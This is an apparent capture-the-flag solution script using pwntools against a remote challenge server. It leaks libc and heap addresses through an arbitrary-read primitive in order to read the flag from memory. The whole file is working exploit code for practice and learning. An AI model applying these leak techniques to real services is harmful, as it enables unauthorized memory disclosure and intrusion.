from pwnlib.elf import ELF
from pwnlib.tubes.remote import remote, log
from pwnlib.ui import pause
from pwnlib.util.packing import u64

import pwn


p = remote("tcp.sasc.tf", 2200)
#p = process("./chall")
e = ELF("./chall")
l = ELF("/usr/lib/libc.so.6")


# l = e.libc

pie_base = 0x4011a6 - e.sym['main'] # PIE disabled => fixed
log.critical(hex(pie_base))
p.recv()
p.sendline(hex(pie_base + 0x404010)[2:])
p.recvuntil(b": ")
libc_base = u64(p.recv(6) + b"\x00"*2) - l.sym['_IO_2_1_stdout_'] # get libc leak
log.critical(hex(libc_base))
# pause()
p.recv()
p.sendline(hex(libc_base + 0x203ac0 + 96)) # get main_arena + 96 leak to obtain heap addr
p.recvuntil(b": ")
flag = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) + 0x10 # calc flag addr
log.critical(hex(flag))

p.recv()
p.sendline(hex(flag)) # leak flag

p.interactive()
